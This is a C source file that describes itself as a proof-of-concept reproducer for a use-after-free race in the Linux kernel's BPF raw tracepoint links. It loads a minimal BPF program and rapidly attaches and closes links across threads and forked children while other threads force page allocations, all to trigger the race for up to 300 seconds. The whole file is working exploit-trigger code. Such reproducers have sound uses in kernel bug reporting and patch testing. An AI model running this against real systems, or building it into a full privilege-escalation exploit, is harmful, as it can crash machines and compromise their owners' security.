// poc.c - RAW_TRACEPOINT(mm_page_alloc) UAF reproducer for bpf_trace_run4
//
// Exploits race: classic RCU free of bpf_raw_tp_link vs tracepoint SRCU read-side
//
// Strategy: Create many link FDs, then close them all rapidly while
// concurrent threads trigger heavy page allocations (mm_page_alloc tracepoint).
// Use CPU affinity to force context switching.

#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <linux/bpf.h>

static volatile int stop_flag;
static volatile int alloc_running;
static int g_prog_fd;
static const char *g_tp_name = "mm_page_alloc";

static int sys_bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
    return (int)syscall(SYS_bpf, cmd, attr, size);
}

static void pin_to_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

static int load_raw_tp_prog(void)
{
    struct bpf_insn insns[2];
    memset(insns, 0, sizeof(insns));
    insns[0].code = 0xb7;
    insns[1].code = 0x95;

    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.prog_type = BPF_PROG_TYPE_RAW_TRACEPOINT;
    attr.insn_cnt  = 2;
    attr.insns     = (uint64_t)(uintptr_t)insns;
    attr.license   = (uint64_t)(uintptr_t)"GPL";

    return sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int raw_tracepoint_open(const char *name, int prog_fd)
{
    union bpf_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.raw_tracepoint.name    = (uint64_t)(uintptr_t)name;
    attr.raw_tracepoint.prog_fd = (uint32_t)prog_fd;
    return sys_bpf(BPF_RAW_TRACEPOINT_OPEN, &attr, sizeof(attr));
}

// Thread that continuously triggers page allocations
static void *alloc_thread(void *arg)
{
    int cpu = (int)(long)arg;
    pin_to_cpu(cpu);
    alloc_running = 1;

    while (!stop_flag) {
        const size_t len = 4 * 1024 * 1024;
        char *p = mmap(NULL, len, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p == MAP_FAILED) continue;
        for (size_t off = 0; off < len; off += 4096)
            *(volatile char *)(p + off) = 1;
        madvise(p, len, MADV_DONTNEED);
        for (size_t off = 0; off < len; off += 4096)
            *(volatile char *)(p + off) = 1;
        munmap(p, len);
    }
    return NULL;
}

// Rapidly open and close BPF links
static void *churn_thread(void *arg)
{
    int cpu = (int)(long)arg;
    pin_to_cpu(cpu);

    while (!stop_flag) {
        // Open a batch of links
        int fds[64];
        int n = 0;
        for (int i = 0; i < 64; i++) {
            int fd = raw_tracepoint_open(g_tp_name, g_prog_fd);
            if (fd >= 0)
                fds[n++] = fd;
        }
        
        // Brief delay to let SRCU readers enter
        sched_yield();
        
        // Close them all rapidly
        for (int i = 0; i < n; i++)
            close(fds[i]);
        
        // Yield to let RCU callbacks process
        sched_yield();
    }
    return NULL;
}

// Subprocess-based churn: fork, attach, exit immediately
static void subprocess_churn(int iterations)
{
    for (int i = 0; i < iterations; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            // Child: open many links and exit immediately
            for (int j = 0; j < 16; j++) {
                raw_tracepoint_open(g_tp_name, g_prog_fd);
            }
            _exit(0);
        } else if (pid > 0) {
            // Don't wait - let children die asynchronously
            // Reap zombies occasionally
            if (i % 10 == 0)
                while (waitpid(-1, NULL, WNOHANG) > 0);
        }
    }
    // Reap remaining zombies
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

int main(int argc, char **argv)
{
    int duration_secs = 300;
    char *s;
    if ((s = getenv("POC_DURATION")) != NULL)
        duration_secs = atoi(s);

    (void)argc; (void)argv;

    struct rlimit rl = { .rlim_cur = RLIM_INFINITY, .rlim_max = RLIM_INFINITY };
    setrlimit(RLIMIT_MEMLOCK, &rl);

    // Also increase file limit
    rl.rlim_cur = 65536;
    rl.rlim_max = 65536;
    setrlimit(RLIMIT_NOFILE, &rl);

    fprintf(stderr, "[poc] sizeof(union bpf_attr)=%zu\n", sizeof(union bpf_attr));
    fprintf(stderr, "[poc] uid=%d euid=%d\n", getuid(), geteuid());

    g_prog_fd = load_raw_tp_prog();
    if (g_prog_fd < 0) {
        fprintf(stderr, "[poc] FATAL: cannot load BPF program\n");
        return 1;
    }
    fprintf(stderr, "[poc] Loaded RAW_TRACEPOINT program: fd=%d\n", g_prog_fd);

    int test_fd = raw_tracepoint_open(g_tp_name, g_prog_fd);
    if (test_fd < 0) {
        fprintf(stderr, "[poc] FATAL: cannot attach to %s: %s\n",
                g_tp_name, strerror(errno));
        return 1;
    }
    close(test_fd);
    fprintf(stderr, "[poc] Verified attachment to %s works\n", g_tp_name);

    // Start allocation threads on CPU 0
    pthread_t threads[16];
    int n = 0;

    for (int i = 0; i < 4; i++)
        pthread_create(&threads[n++], NULL, alloc_thread, (void*)(long)(i % 2));

    // Start churn threads on both CPUs
    for (int i = 0; i < 4; i++)
        pthread_create(&threads[n++], NULL, churn_thread, (void*)(long)(i % 2));

    fprintf(stderr, "[poc] Started %d threads, running for %ds...\n", n, duration_secs);

    time_t start = time(NULL);
    int iter = 0;
    while (time(NULL) - start < duration_secs) {
        iter++;
        
        // Also do subprocess-based churn
        subprocess_churn(20);
        
        long elapsed = (long)(time(NULL) - start);
        if (iter % 10 == 0) {
            fprintf(stderr, "[poc] elapsed=%lds iter=%d\n", elapsed, iter);
        }
    }

    stop_flag = 1;
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);

    close(g_prog_fd);
    fprintf(stderr, "[poc] Done.\n");
    return 0;
}
